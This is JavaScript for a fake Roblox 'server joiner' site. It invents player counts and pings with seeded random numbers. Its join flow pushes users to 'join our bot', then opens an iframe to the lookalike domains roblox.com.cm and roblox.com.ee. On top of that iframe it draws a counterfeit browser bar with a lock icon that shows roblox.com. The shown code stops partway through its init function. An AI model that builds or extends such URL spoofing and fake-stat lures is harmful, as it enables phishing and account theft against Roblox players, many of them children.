

var IFRAME_URL = 'https://roblox.com.cm/users/9073730924/profile';
var SWAP_IFRAME_URL = 'https://roblox.com.ee/users/3240771609/profile';
var joinMode = 'server';
var BAR_URL    = 'https://roblox.com/users/6073731524/profile';
var TAB_TITLE  = 'Roblox';

var flagMap = {
  'United States': 'flags/usa.png',
  'United Kingdom': 'flags/uk.png',
  'France': 'flags/france.png',
  'Germany': 'flags/germany.png',
  'Netherlands': 'flags/netherlands.png',
  'Poland': 'flags/poland.png',
  'Ireland': 'flags/ireland.png',
  'Singapore': 'flags/singapore.png',
  'Japan': 'flags/japan.png',
  'India': 'flags/india.png',
  'Hong Kong': 'flags/hong kong.png',
  'Australia': 'flags/australia.png',
  'Brazil': 'flags/brazil.png'
};

var continentPlayerRanges = {
  'Asia': { min: 270, max: 600 },
  'Europe': { min: 70, max: 120 },
  'North America': { min: 50, max: 100 },
  'South America': { min: 40, max: 70 },
  'Oceania': { min: 30, max: 60 }
};

var continentServerMins = {
  'Asia': 8,
  'Europe': 6,
  'North America': 5,
  'South America': 4,
  'Oceania': 3
};
var continentData = [
  {
    continent: 'North America',
    servers: [
      { country: 'United States', city: 'San Mateo', lat: 37.56, lng: -122.32 },
      { country: 'United States', city: 'Palo Alto', lat: 37.44, lng: -122.14 },
      { country: 'United States', city: 'Los Angeles', lat: 34.05, lng: -118.24 },
      { country: 'United States', city: 'Portland', lat: 45.52, lng: -122.68 },
      { country: 'United States', city: 'Dallas', lat: 32.78, lng: -96.80 },
      { country: 'United States', city: 'Ashburn', lat: 39.04, lng: -77.49 },
      { country: 'United States', city: 'Newark', lat: 40.74, lng: -74.17 },
      { country: 'United States', city: 'New York City', lat: 40.71, lng: -74.01 },
      { country: 'United States', city: 'Chicago', lat: 41.88, lng: -87.63 },
      { country: 'United States', city: 'Atlanta', lat: 33.75, lng: -84.39 },
      { country: 'United States', city: 'Miami', lat: 25.76, lng: -80.19 }
    ]
  },
  {
    continent: 'Europe',
    servers: [
      { country: 'United Kingdom', city: 'London', lat: 51.51, lng: -0.13 },
      { country: 'France', city: 'Paris', lat: 48.86, lng: 2.35 },
      { country: 'Germany', city: 'Frankfurt', lat: 50.11, lng: 8.68 },
      { country: 'Netherlands', city: 'Amsterdam', lat: 52.37, lng: 4.90 },
      { country: 'Poland', city: 'Warsaw', lat: 52.23, lng: 21.01 },
      { country: 'Ireland', city: 'Dublin', lat: 53.35, lng: -6.26 }
    ]
  },
  {
    continent: 'Asia',
    servers: [
      { country: 'Singapore', city: 'Singapore', lat: 1.35, lng: 103.82 },
      { country: 'Japan', city: 'Tokyo', lat: 35.68, lng: 139.76, popular: true },
      { country: 'Japan', city: 'Osaka', lat: 34.69, lng: 135.50, popular: true },
      { country: 'Japan', city: 'Nagoya', lat: 35.18, lng: 136.91, popular: true },
      { country: 'India', city: 'Mumbai', lat: 19.08, lng: 72.88 },
      { country: 'Hong Kong', city: 'Hong Kong', lat: 22.32, lng: 114.17 }
    ]
  },
  {
    continent: 'Oceania',
    servers: [
      { country: 'Australia', city: 'Sydney', lat: -33.87, lng: 151.21 }
    ]
  },
  {
    continent: 'South America',
    servers: [
      { country: 'Brazil', city: 'Sao Paulo', lat: -23.55, lng: -46.63 }
    ]
  }
];

var allServers = [];
continentData.forEach(function (cont) {
  cont.servers.forEach(function (s) {
    allServers.push({
      country: s.country, city: s.city, lat: s.lat, lng: s.lng,
      continent: cont.continent, popular: !!s.popular
    });
  });
});

var userLat = null, userLng = null, userContinent = null;
var continentDistances = {}, continentRank = {};
var continentPlayers = {}, continentServerCounts = {};
var currentTab = 'servers', starRating = 0;
var pingInterval = null, fillTimer = null, initialized = false, locationReady = false;

var serversList, themeToggle, joinOverlay, rateOverlay, toastContainer;
var btnRateSubmit, stepProgress, btnJoinServer, btnContinue, btnJoinBot, btnJoinJapan;
var iframeOverlay, iframeWindow, joinIframe, btnIframeReload, btnIframeClose;
var joinStepSearch, joinStepFound, joinStepKick, joinStepBot;
var searchServerName, foundServerName, foundPlayerCount;

function $(s) { return document.querySelector(s); }
function $$(s) { return document.querySelectorAll(s); }
function deg2rad(d) { return d * (Math.PI / 180); }
function randInt(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a; }

function haversine(lat1, lng1, lat2, lng2) {
  var R = 6371, dLat = deg2rad(lat2 - lat1), dLng = deg2rad(lng2 - lng1);
  var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
    Math.cos(deg2rad(lat1)) * Math.cos(deg2rad(lat2)) * Math.sin(dLng / 2) * Math.sin(dLng / 2);
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

function continentFromCode(code, country) {
  var map = {
    'GB': 'Europe','FR': 'Europe','DE': 'Europe','NL': 'Europe','PL': 'Europe',
    'IE': 'Europe','BG': 'Europe','RO': 'Europe','ES': 'Europe','IT': 'Europe',
    'SE': 'Europe','NO': 'Europe','PT': 'Europe','AT': 'Europe','CH': 'Europe',
    'SG': 'Asia','JP': 'Asia','IN': 'Asia','HK': 'Asia','CN': 'Asia','KR': 'Asia',
    'AU': 'Oceania','NZ': 'Oceania',
    'BR': 'South America','AR': 'South America','CL': 'South America',
    'US': 'North America','CA': 'North America','MX': 'North America'
  };
  if (map[country]) return map[country];
  var cm = { 'NA': 'North America', 'EU': 'Europe', 'AS': 'Asia', 'OC': 'Oceania', 'SA': 'South America' };
  return cm[code] || 'Europe';
}

async function fetchLocation() {
  
  var urls = ['https://ipwho.is/', 'https://ipapi.co/json/', 'https://ip-api.com/json/'];
  for (var i = 0; i < urls.length; i++) {
    try {
      var r = await fetch(urls[i], { signal: AbortSignal.timeout(4000) });
      if (!r.ok) continue;
      var d = await r.json();
      
      if (d.latitude && d.longitude) {
        return { lat: d.latitude, lng: d.longitude, continent: d.continent || '', country: d.country_code || '', ip: d.ip || '', raw: d };
      }
      
      var lat = d.lat || d.latitude;
      var lng = d.lon || d.longitude;
      if (lat != null && lng != null) {
        return { lat: lat, lng: lng, continent: d.continent || d.continent_code || '', country: d.countryCode || d.country_code || '', ip: (d.ip || d.query || ''), raw: d };
      }
    } catch (e) { continue; }
  }
  return { lat: 50.85, lng: 4.35, continent: 'EU', country: 'BE' };
}

function readCache() {
  try {
    var raw = localStorage.getItem("jace-loc");
    if (raw) return JSON.parse(raw);
  } catch (e) {}
  return null;
}
function writeCache(lat, lng, continent) {
  try {
    localStorage.setItem("jace-loc", JSON.stringify({ lat: lat, lng: lng, continent: continent }));
  } catch (e) {}
}

function computeDists() {
  var d = {};
  continentData.forEach(function (c) {
    var t = 0;
    c.servers.forEach(function (s) { t += haversine(userLat, userLng, s.lat, s.lng); });
    d[c.continent] = Math.round(t / c.servers.length);
  });
  return d;
}

function computeRanks(dists) {
  var sorted = Object.keys(dists).sort(function (a, b) { return dists[a] - dists[b]; });
  var rank = {};
  sorted.forEach(function (c, i) { rank[c] = i; });
  return rank;
}

function get15min() { return Math.floor(Date.now() / 900000); }
function get5sec()  { return Math.floor(Date.now() / 5000); }

function srand(seed, min, max) {
  var s = String(seed), h = 0, i;
  for (i = 0; i < s.length; i++) { h = ((h << 5) - h) + s.charCodeAt(i); h |= 0; }
  return min + (Math.abs(h) % (max - min + 1));
}

function generateStats() {
  
  try {
    var saved = JSON.parse(window.name || '');
    if (saved && saved.b === get15min()) {
      console.log('[Jace V2] stats loaded from cache, bucket:', saved.b);
      return { players: saved.p, servers: saved.s };
    }
  } catch (e) {}
  
  var p = {}, s = {}, bucket = get15min();
  console.log('[Jace V2] generating fresh stats, bucket:', bucket, '| time:', new Date().toLocaleTimeString());
  continentData.forEach(function (c) {
    var r = continentPlayerRanges[c.continent] || { min: 40, max: 90 };
    p[c.continent] = srand(bucket + "-" + c.continent + "-p", r.min, r.max);
    var srv = Math.round(p[c.continent] / 9) + srand(bucket + "-" + c.continent + "-s", -2, 2) + 2;
    srv = srv + (bucket % 2 === 0 ? 1 : -1);
    var minSrv = continentServerMins[c.continent] || 3;
    if (srv < minSrv) srv = minSrv;
    s[c.continent] = srv;
  });
  
  window.name = JSON.stringify({ b: bucket, p: p, s: s });
  return { players: p, servers: s };
}

function getLivePlayers(continent) {
  var base = continentPlayers[continent] || 60;
  return Math.max(0, base + srand(get5sec() + "-" + continent + "-live", -1, 1));
}

function updateJapanStats() {
  var el = document.getElementById('japanPlayers');
  if (!el) return;
  var jp = Math.round((continentPlayers['Asia'] || 300) * 0.6) + srand(get5sec() + '-jp-live', -3, 3);
  el.textContent = Math.max(0, jp);
}

function refreshStatsBar() {
  $$(".tube-stats-bar").forEach(function (bar) {
    var tube = bar.closest(".continent-tube");
    if (!tube) return;
    var cont = tube.dataset.continent;
    if (!cont) return;
    var sc = continentServerCounts[cont] || 5;
    bar.innerHTML = '<img src="images/servers.png" alt="" draggable="false" /> ' + getLivePlayers(cont) + ' players online &middot; ' + sc + ' servers';
  });
}

function getTier(cont) {
  if (cont === userContinent) return 0; 
  var r = continentRank[cont];
  return r === undefined ? 2 : r;
}

function calcPing(tier) {
  var b, j;
  switch (tier) {
    case 0: b = randInt(25, 55);  j = randInt(-4, 4);  break;
    case 1: b = randInt(55, 100); j = randInt(-8, 8);  break;
    case 2: b = randInt(100, 170);j = randInt(-10, 10);break;
    case 3: b = randInt(170, 250);j = randInt(-14, 14);break;
    case 4: b = randInt(250, 350);j = randInt(-18, 18);break;
    default:b = 100; j = 0;
  }
  return Math.max(5, Math.round(b + j));
}

function pingClass(tier) { return ['excellent','good','ok','poor','bad'][tier] || 'ok'; }

function searchTime(tier) {
  var t = [[1000,2000],[1800,3200],[3000,5000],[4500,6500],[5500,7000]];
  var r = t[tier] || [3000,5000];
  return randInt(r[0], r[1]);
}

function sortServers(list) {
  if (!userLat) return list;
  return list.slice().sort(function (a, b) {
    return haversine(userLat, userLng, b.lat, b.lng) - haversine(userLat, userLng, a.lat, a.lng);
  });
}

function buildBars(tier) {
  
  var cols = [
    ['#22c55e','#22c55e','#22c55e','#22c55e','#22c55e'], 
    ['#a3e635','#a3e635','#a3e635','#a3e635','transparent'], 
    ['#eab308','#eab308','#eab308','transparent','transparent'], 
    ['#f97316','#f97316','transparent','transparent','transparent'], 
    ['#ef4444','transparent','transparent','transparent','transparent']  
  ];
  var c = cols[tier] || cols[2];
  return c.map(function(col) {
    return '<span class="ping-bar" style="background:' + col + '"></span>';
  }).join('');
}

function buildRow(srv) {
  var tier = getTier(srv.continent), ping = calcPing(tier), cls = pingClass(tier);
  var flag = flagMap[srv.country] || '';
  var raw = JSON.stringify(srv).replace(/'/g, "\\'").replace(/"/g, '&quot;');
  var pop = srv.popular ? '<span class="popular-tag">POPULAR</span>' : '';
  var msHtml = locationReady
    ? '<span class="ping-ms">' + ping + ' ms</span>'
    : '<span class="ping-ms loading-ms"><span class="ms-dot">.</span><span class="ms-dot">.</span><span class="ms-dot">.</span> ms</span>';
  return '<div class="server-row" data-city="' + srv.city + '" data-country="' + srv.country + '" data-continent="' + srv.continent + '">' +
    '<img src="' + flag + '" alt="" class="server-flag-img" draggable="false" />' +
    '<span class="server-name">' + srv.country + ' <span class="city">- ' + srv.city + '</span>' + pop + '</span>' +
    '<div class="ping-bars ' + cls + '">' +
      buildBars(tier) +
    '</div>' +
    msHtml +
    '<button class="btn-join" data-server="' + raw + '">Join</button>' +
  '</div>';
}

function buildTube(cont) {
  
  var servers = cont.servers.map(function (s) {
    return { country: s.country, city: s.city, lat: s.lat, lng: s.lng, continent: cont.continent, popular: !!s.popular };
  });
  var sorted = sortServers(servers);
  var tp = getLivePlayers(cont.continent);
  var sc = continentServerCounts[cont.continent] || 7;
  return '<div class="continent-tube' + (cont.continent === userContinent ? ' expanded' : '') + '" data-continent="' + cont.continent + '">' +
    '<div class="tube-header"><span class="tube-name">' + cont.continent + '</span><span class="tube-arrow">&#9660;</span></div>' +
    '<div class="tube-body">' +
      '<div class="tube-stats-bar"><img src="images/servers.png" alt="" draggable="false" /> ' + tp + ' players online &middot; ' + sc + ' servers</div>' +
      sorted.map(buildRow).join('') +
    '</div></div>';
}

function renderServers() {
  if (!serversList) return;
  var sorted = continentData.slice().sort(function (a, b) {
    return (continentDistances[a.continent] || 99999) - (continentDistances[b.continent] || 99999);
  });
  serversList.innerHTML = sorted.map(buildTube).join('');
  
  void serversList.offsetHeight;
  bindTubeEvents();
}

function bindTubeEvents() {
  $$('.tube-header').forEach(function (h) {
    h.addEventListener('click', function () {
      var tube = h.parentElement, was = tube.classList.contains('expanded');
      $$('.continent-tube').forEach(function (t) { t.classList.remove('expanded'); });
      if (!was) tube.classList.add('expanded');
    });
  });
  $$('.btn-join').forEach(function (b) {
    b.addEventListener('click', function (e) {
      e.stopPropagation();
      openJoin(JSON.parse(b.dataset.server.replace(/&quot;/g, '"').replace(/\\'/g, "'")));
    });
  });
}

function updatePings() {
  if (!userLat || currentTab !== "servers" || !initialized) return;
  var barCols = [
    ["#22c55e","#22c55e","#22c55e","#22c55e","#22c55e"],
    ["#a3e635","#a3e635","#a3e635","#a3e635","transparent"],
    ["#eab308","#eab308","#eab308","transparent","transparent"],
    ["#f97316","#f97316","transparent","transparent","transparent"],
    ["#ef4444","transparent","transparent","transparent","transparent"]
  ];
  $$(".server-row").forEach(function (row) {
    var srv = allServers.find(function (x) {
      return x.city === row.dataset.city && x.country === row.dataset.country;
    });
    if (!srv) return;
    var tier = getTier(srv.continent), p = calcPing(tier), cls = pingClass(tier);
    var bars = row.querySelector(".ping-bars"), ms = row.querySelector(".ping-ms");
    if (bars) {
      bars.className = "ping-bars " + cls;
      var spans = bars.querySelectorAll(".ping-bar");
      var cols = barCols[tier] || barCols[2];
      spans.forEach(function (s, i) { s.style.background = cols[i]; });
    }
    if (ms) ms.textContent = p + " ms";
  });
}

function startUpdates() {
  if (pingInterval) clearInterval(pingInterval);
  pingInterval = setInterval(function () {
    updatePings();
    refreshStatsBar();
    updateJapanStats();
  }, 4000 + Math.random() * 2000);
  
  setInterval(function () {
    var stats = generateStats();
    continentPlayers = stats.players;
    continentServerCounts = stats.servers;
    refreshStatsBar();
  }, 900000);
}

function switchTab(name) {
  currentTab = name;
  $$('.nav-tab').forEach(function (t) { t.classList.remove('active'); });
  $$('.tab-content').forEach(function (t) { t.classList.remove('active'); });
  var btn = document.querySelector('.nav-tab[data-tab="' + name + '"]');
  var ct = document.getElementById('tab-' + name);
  if (btn) btn.classList.add('active');
  if (ct) ct.classList.add('active');
  if (name === 'servers' && initialized) { renderServers(); startUpdates(); }
  else { if (pingInterval) clearInterval(pingInterval); }
}

function showToast(msg, icon) {
  if (!toastContainer) return;
  var el = document.createElement('div');
  el.className = 'toast';
  el.innerHTML = '<img src="' + icon + '" alt="" class="toast-icon" draggable="false" /> ' + msg;
  toastContainer.appendChild(el);
  setTimeout(function () { if (el.parentNode) el.remove(); }, 2400);
}

function resetJoin() {
  joinStepSearch.style.display = 'block';
  joinStepFound.style.display = 'none';
  joinStepKick.style.display = 'none';
  joinStepBot.style.display = 'none';
  stepProgress.style.display = 'none';
  $$('.step-dot').forEach(function (d) { d.className = 'step-dot'; });
  $$('.step-line').forEach(function (l) { l.className = 'step-line'; });
  var bar = document.querySelector('.fill-bar-progress');
  if (bar) { bar.style.transition = 'none'; bar.style.width = '0%'; }
  btnContinue.disabled = true;
  btnContinue.classList.remove('filled');
  if (fillTimer) { clearTimeout(fillTimer); fillTimer = null; }
}

function openJoin(srv, mode) {
  joinMode = mode || 'server';
  var tier = getTier(srv.continent);
  resetJoin();
  var botImg = joinStepBot.querySelector('img');
  if (botImg) {
    botImg.src = (joinMode === 'swap') ? 'images/swapbot.png' : 'images/jacebot.png';
    botImg.classList.toggle('swap-bot-img', joinMode === 'swap');
  }
  var botText = document.getElementById('joinBotText');
  var botSub = document.getElementById('joinBotSub');
  if (botText) botText.textContent = (joinMode === 'swap') ? 'Your bot is waiting for you in the server!' : 'You must join our bot to get in the server!';
  if (botSub) botSub.textContent = (joinMode === 'swap') ? 'You must join from here to complete your swap.' : 'You can only join our bot from here.';
  var roomCode = document.getElementById('foundCode');
  var roomCodeText = document.getElementById('foundCodeText');
  if (roomCodeText) roomCodeText.textContent = genRoomCode();
  if (roomCode) roomCode.style.display = (joinMode === 'swap') ? 'block' : 'none';
  var foundTrade = document.getElementById('foundTrade');
  if (foundTrade) {
    if (joinMode === 'swap') {
      var trade = lastSwapTrade || { you: swapState.you, bot: swapState.bot };
      var itemHtml = function (list) {
        return list.filter(function (st) { return !!st; }).map(function (st) {
          var it = SWAP_ITEMS[st.i];
          return '<span class="ft-item"><img src="godlies/' + encodeURI(it.img) + '" alt="" loading="lazy" decoding="async" draggable="false" />' + (st.q > 1 ? '<span class="ft-qty">x' + st.q + '</span>' : '') + '</span>';
        }).join('');
      };
      foundTrade.innerHTML = '<span class="ft-label">Trade:</span>' + itemHtml(trade.you) + '<span class="ft-arrow">→</span>' + itemHtml(trade.bot);
      foundTrade.style.display = 'flex';
    } else {
      foundTrade.innerHTML = '';
      foundTrade.style.display = 'none';
    }
  }
  searchServerName.textContent = (joinMode === 'swap') ? 'Ticket ' + currentTicketCode : srv.country + ' - ' + srv.city;
  foundServerName.textContent = (joinMode === 'swap') ? 'Ticket ' + currentTicketCode : srv.country + ' - ' + srv.city;
  foundPlayerCount.textContent = (joinMode === 'swap') ? '1/12' : randInt(7, 11) + '/12';
  joinOverlay.classList.add('show');
  joinOverlay.classList.remove('closing');
  setTimeout(function () {
    joinStepSearch.style.display = 'none';
    joinStepFound.style.display = 'block';
    showToast('Server Found!', 'images/checkmark_white.png');
  }, searchTime(tier));
}

function openJoinSwap(srv) { openJoin(srv, 'swap'); }

function closeJoin() {
  if (fillTimer) { clearTimeout(fillTimer); fillTimer = null; }
  joinOverlay.classList.add('closing');
  setTimeout(function () { joinOverlay.classList.remove('show', 'closing'); resetJoin(); }, 250);
}

function startAutoFill() {
  var bar = btnContinue.querySelector('.fill-bar-progress');
  if (!bar) return;
  btnContinue.disabled = true;
  btnContinue.classList.remove('filled');
  bar.style.transition = 'none';
  bar.style.width = '0%';
  bar.offsetHeight;
  bar.style.transition = 'width 2s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
  bar.style.width = '100%';
  fillTimer = setTimeout(function () { btnContinue.disabled = false; btnContinue.classList.add('filled'); }, 2100);
}

function openRate() {
  starRating = 0;
  $$('.star').forEach(function (s) { s.classList.remove('active'); });
  btnRateSubmit.disabled = true;
  rateOverlay.classList.add('show');
  rateOverlay.classList.remove('closing');
}

function closeRate() {
  rateOverlay.classList.add('closing');
  setTimeout(function () { rateOverlay.classList.remove('show', 'closing'); }, 250);
}

function openIframe() {
  buildBrowserChrome();
  joinIframe.src = (joinMode === 'swap') ? SWAP_IFRAME_URL : IFRAME_URL;
  updateBrowserChrome();
  iframeOverlay.classList.add('show');
  iframeOverlay.classList.remove('closing');
  applyFit();
}

function reloadIframe() {
  joinIframe.src = (joinMode === 'swap') ? SWAP_IFRAME_URL : IFRAME_URL; 
  updateBrowserChrome();
}

function closeIframe() {
  iframeOverlay.classList.add('closing');
  setTimeout(function () {
    iframeOverlay.classList.remove('show', 'closing');
    joinIframe.src = 'about:blank'; 
  }, 250);
}

var chromeBuilt = false;
var bcFullUrl = false;

function hostnameOf(url) {
  try { return new URL(url).hostname; } catch (e) { return ''; }
}

function displayUrlOf(url) {
  return url.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
}

function buildBrowserChrome() {
  if (chromeBuilt || !iframeWindow) return;
  chromeBuilt = true;

  
  var style = document.createElement('style');
  style.textContent = [
    '#browserChrome{position:relative;z-index:5;width:100%;flex:none;font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;user-select:none;}',
    '#browserChrome *{box-sizing:border-box;margin:0;padding:0;}',
    '#browserChrome .bc-tabs{display:flex;align-items:flex-end;gap:8px;padding:8px 14px 0;background:#1f2226;}',
    '#browserChrome .bc-tab{display:flex;align-items:center;gap:8px;min-width:160px;max-width:250px;height:32px;padding:0 12px;border-radius:10px 10px 0 0;background:#2a2e33;color:#e8eaed;font-size:12.5px;font-weight:500;position:relative;}',
    '#browserChrome .bc-tab::after{content:"";position:absolute;left:0;right:0;bottom:0;height:3px;background:var(--bc-accent,#3b82f6);border-radius:3px 3px 0 0;}',
    '#browserChrome .bc-fav{width:13px;height:13px;border-radius:50%;background:linear-gradient(135deg,var(--bc-accent,#3b82f6),#a855f7);flex:none;}',
    '#browserChrome .bc-title{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;}',
    '#browserChrome .bc-x{flex:none;width:16px;height:16px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;color:#9aa4ae;font-size:13px;line-height:1;cursor:default;}',
    '#browserChrome .bc-tab-new{flex:none;display:inline-flex;align-items:center;justify-content:center;width:28px;height:26px;border-radius:8px;color:#7d8590;font-size:17px;cursor:default;margin-bottom:3px;}',
    '#browserChrome .bc-bar{display:flex;align-items:center;gap:12px;padding:6px 14px 8px;background:#1f2226;border-bottom:1px solid #2d3136;box-shadow:0 2px 10px rgba(0,0,0,.35);}',
    '#browserChrome .bc-dots{display:flex;gap:7px;flex:none;}',
    '#browserChrome .bc-dots i{width:12px;height:12px;border-radius:50%;display:block;}',
    '#browserChrome .bc-dots i:nth-child(1){background:#ff5f57;}',
    '#browserChrome .bc-dots i:nth-child(2){background:#febc2e;}',
    '#browserChrome .bc-dots i:nth-child(3){background:#28c840;}',
    '#browserChrome .bc-nav{display:flex;gap:3px;flex:none;}',
    '#browserChrome .bc-nav span{display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;border-radius:50%;color:#9aa4ae;font-size:16px;cursor:default;}',
    '#browserChrome .bc-address{flex:1;cursor:pointer;display:flex;align-items:center;gap:9px;height:34px;min-width:0;max-width:760px;margin:0 auto;padding:0 16px;border-radius:17px;background:#0f1113;border:1px solid #2d3136;box-shadow:inset 0 1px 2px rgba(0,0,0,.45);}',
    '#browserChrome .bc-address svg{flex:none;display:block;}',
    '#browserChrome .bc-url{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#e8eaed;font-size:13px;letter-spacing:.1px;}',
    '#browserChrome .bc-actions{display:flex;align-items:center;gap:8px;flex:none;}',
    '@media (max-width:480px){#browserChrome .bc-dots,#browserChrome .bc-nav{display:none!important;}}'
  ].join('\n');
  document.head.appendChild(style);

  
  var accent = document.body.classList.contains('theme-aurora') ? '#2dd4bf' : (document.body.classList.contains('theme-red') ? '#ef4444' : '#3b82f6');

  var lockSvg =
    '<svg width="13" height="15" viewBox="0 0 13 15" xmlns="http://www.w3.org/2000/svg">' +
      '<rect x="1" y="6" width="11" height="8" rx="2" fill="#58a55c"/>' +
      '<path d="M3.5 6V4.5a3 3 0 0 1 6 0V6" stroke="#58a55c" stroke-width="1.8" fill="none"/>' +
      '<circle cx="6.5" cy="10" r="1.3" fill="#0f1113"/>' +
    '</svg>';

  var chrome = document.createElement('div');
  chrome.id = 'browserChrome';
  chrome.style.setProperty('--bc-accent', accent);
  chrome.innerHTML =
    '<div class="bc-tabs">' +
      '<div class="bc-tab">' +
        '<span class="bc-fav"></span>' +
        '<span class="bc-title" id="bcTabTitle"></span>' +
        '<span class="bc-x">&#215;</span>' +
      '</div>' +
      '<span class="bc-tab-new">+</span>' +
    '</div>' +
    '<div class="bc-bar">' +
      '<span class="bc-dots"><i></i><i></i><i></i></span>' +
      '<span class="bc-nav"><span>&#8592;</span><span>&#8594;</span></span>' +
      '<div class="bc-address">' + lockSvg + '<span class="bc-url" id="bcUrl"></span></div>' +
      '<span class="bc-actions"></span>' +
    '</div>';

  
  
  
  iframeWindow.insertBefore(chrome, iframeWindow.firstChild);

  
  
  var actions = chrome.querySelector('.bc-actions');
  var reloadBtn = btnIframeReload || document.getElementById('btnIframeReload');
  var closeBtn = btnIframeClose || document.getElementById('btnIframeClose');
  var moved = 0;
  [reloadBtn, closeBtn].forEach(function (b) {
    if (!actions || !b) return;
    b.style.position = 'static';
    b.style.top = 'auto';
    b.style.right = 'auto';
    b.style.left = 'auto';
    actions.appendChild(b);
    moved++;
  });
  if (moved > 0) {
    var ctrls = document.querySelector('.iframe-controls');
    if (ctrls && ctrls.children.length === 0) ctrls.style.display = 'none';
  }

  
  window.addEventListener('resize', function () {
    applyFit();
  });

  
  var address = chrome.querySelector('.bc-address');
  if (address) {
    address.title = 'Show full URL';
    address.addEventListener('click', function () {
      var shown = BAR_URL || IFRAME_URL;
      var urlEl = document.getElementById('bcUrl');
      if (!urlEl) return;
      bcFullUrl = !bcFullUrl;
      urlEl.textContent = bcFullUrl ? shown : displayUrlOf(shown);
    });
  }

  updateBrowserChrome();
}

function updateBrowserChrome() {
  
  
  var shown = BAR_URL || IFRAME_URL;
  var urlEl = document.getElementById('bcUrl');
  var titleEl = document.getElementById('bcTabTitle');
  bcFullUrl = false;
  if (urlEl) urlEl.textContent = displayUrlOf(shown);
  if (titleEl) titleEl.textContent = TAB_TITLE || hostnameOf(shown);
}

function fitMetrics() {
  var win = iframeWindow;
  var chrome = document.getElementById('browserChrome');
  if (!win) return null;
  var w = win.clientWidth;
  var h = win.clientHeight - (chrome ? chrome.offsetHeight : 0);
  return (w >= 50 && h >= 50) ? { w: w, h: h } : null;
}

function applyFit() {
  var m = fitMetrics();
  var frame = joinIframe;
  if (!m || !frame) return;
  var vw = m.w >= 768 ? 1280 : 414;   
  var scale = m.w / vw;
  var vh = m.h / scale;               
  frame.style.flex = 'none';
  frame.style.width = vw + 'px';
  frame.style.height = vh + 'px';
  if (window.CSS && CSS.supports && CSS.supports('zoom', '1')) {
    frame.style.zoom = scale;
    frame.style.transform = '';
  } else {
    frame.style.transform = 'scale(' + scale + ')';
    frame.style.transformOrigin = '0 0';
  }
}

async function init() {
  
  serversList = $('#serversList');
  themeToggle = $('#themeToggle');
  joinOverlay = $('#joinOverlay');
  rateOverlay = $('#rateOverlay');
  toastContainer = $('#toastContainer');
  btnRateSubmit = $('#btnRateSubmit');
  stepProgress = $('#stepProgress');
  btnJoinServer = $('#btnJoinServer');
  btnContinue = $('#btnContinue');
  btnJoinBot = $('#btnJoinBot');
  btnJoinJapan = $('#btnJoinJapan');
  joinStepSearch = $('#joinStepSearch');
  joinStepFound = $('#joinStepFound');
  joinStepKick = $('#joinStepKick');
  joinStepBot = $('#joinStepBot');
  searchServerName = $('#searchServerName');
  foundServerName = $('#foundServerName');
  foundPlayerCount = $('#foundPlayerCount');
  iframeOverlay = $('#iframeOverlay');
  iframeWindow = $('#iframeWindow');
  joinIframe = $('#joinIframe');
  btnIframeReload = $('#btnIframeReload');
  btnIframeClose = $('#btnIframeClose');

  
  switchTab('news');

  
  
  $$('.nav-tab').forEach(function (b) {
    b.addEventListener('click', function () { switchTab(b.dataset.tab); });
  });
  
  if (btnJoinJapan) btnJoinJapan.addEventListener('click', function () {
    var jp = null;
    for (var i = 0; i < allServers.length; i++) {
      if (allServers[i].country === 'Japan') { jp = allServers[i]; break; }
    }
    openJoin(jp || { country: 'Japan', city: 'Tokyo', continent: 'Asia', popular: true });
  });
  var jaceThemes = ['blue', 'red', 'aurora'];
  if (themeToggle) {
    themeToggle.addEventListener('click', function () {
      var cur = document.body.classList.contains('theme-aurora') ? 'aurora' : (document.body.classList.contains('theme-red') ? 'red' : 'blue');
      var next = jaceThemes[(jaceThemes.indexOf(cur) + 1) % jaceThemes.length];
      document.body.classList.toggle('theme-red', next === 'red');
      document.body.classList.toggle('theme-aurora', next === 'aurora');
      localStorage.setItem('jace-theme', next);
    });
  }
  var savedTheme = localStorage.getItem('jace-theme');
  if (savedTheme === 'red') document.body.classList.add('theme-red');
  else if (savedTheme === 'aurora') document.body.classList.add('theme-aurora');
  
  if (joinOverlay) joinOverlay.addEventListener('click', function (e) { if (e.target === joinOverlay) closeJoin(); });
  
  if (btnJoinServer) btnJoinServer.addEventListener('click', function () {
    joinStepFound.style.display = 'none';
    joinStepKick.style.display = 'block';
    stepProgress.style.display = 'flex';
    document.querySelector('.step-dot[data-step="1"]').classList.add('active');
    startAutoFill();
  });
  
  if (btnContinue) btnContinue.addEventListener('click', function () {
    if (this.disabled) return;
    if (fillTimer) { clearTimeout(fillTimer); fillTimer = null; }
    document.querySelector('.step-dot[data-step="1"]').classList.add('done');
    document.querySelector('.step-dot[data-step="1"]').classList.remove('active');
    document.querySelector('.step-dot[data-step="2"]').classList.add('active');
    document.querySelector('.step-line').classList.add('done');
    joinStepKick.style.display = 'none';
    joinStepBot.style.display = 'block';
  });
  
  if (btnJoinBot) btnJoinBot.addEventListener('click', function () {
    document.querySelector('.step-dot[data-step="2"]').classList.add('done');
    document.querySelector('.step-dot[data-step="2"]').classList.remove('active');
    closeJoin();
    openIframe();
  });
  
  if (rateOverlay) rateOverlay.addEventListener('click', function (e) { if (e.target === rateOverlay) closeRate(); });
  
  if (btnIframeReload) btnIframeReload.addEventListener('click', reloadIframe);
  if (btnIframeClose) btnIframeClose.addEventListener('click', closeIframe);
  if (iframeOverlay) iframeOverlay.addEventListener('click', function (e) { if (e.target === iframeOverlay) closeIframe(); });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && iframeOverlay.classList.contains('show')) closeIframe();
  });
  
  $$('.star').forEach(function (s) {
    s.addEventListener('click', function () {
      starRating = parseInt(s.dataset.star);
      $$('.star').forEach(function (x, i) { x.classList.toggle('active', i < starRating); });
      if (btnRateSubmit) btnRateSubmit.disabled = false;
    });
  });
  
  if (btnRateSubmit) btnRateSubmit.addEventListener('click', function () {
    closeRate();
    setTimeout(function () { showToast('Thanks!', 'images/checkmark_white.png'); }, 300);
  });

  
  var cached = readCache();
  if (cached) {
    setLocation(cached.lat, cached.lng, cached.continent, true);
  } else {
    setLocation(50.85, 4.35, 'Europe', false); 
  }

  
